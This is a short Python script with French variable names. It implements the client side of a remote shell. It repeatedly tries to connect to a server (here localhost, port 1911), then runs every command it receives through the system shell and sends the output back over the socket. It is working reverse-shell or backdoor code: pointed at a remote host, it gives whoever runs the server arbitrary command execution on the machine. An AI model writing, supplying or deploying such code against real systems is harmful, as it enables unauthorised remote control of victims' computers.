import socket, os, subprocess, time
boucle = True
hote = "localhost"
port = 1911
clearconsole = "cls"
nothing = "commande sans output".encode()

os.system(clearconsole)
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while boucle is True:
    try:
        print("connexion..")
        socket.connect((hote, port))
        os.system(clearconsole)
        print("Connecté !")
        boucle = False
    except ConnectionRefusedError:
        time.sleep(3)
        os.system(clearconsole)
        print("Aucun server ",hote," n'est ouvert")

boucle = True

while boucle is True:
    jesuisou = os.getcwd().encode()
    socket.send(jesuisou)
    
    commande = socket.recv(50).decode()
    if commande != "closeserverclient":
        stderr = b''
        stdout = b''
        if 'cd' in commande:
            derniereLettre = commande[-1]
            directory = commande[3:-1]+derniereLettre
            try:
                os.chdir(directory)
            except FileNotFoundError:
                stdout = b"Le dossier/fichier n'existe pas"
        else:
            commande = commande.encode()
            spl = subprocess.Popen(str(commande, "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = spl.communicate()
        if stdout == b'':
            socket.send(stderr)
        if stderr == b'':
            socket.send(stdout)
        if stdout == b'' and stderr == b'':
            socket.send(nothing)
    else:
        boucle = False
socket.close()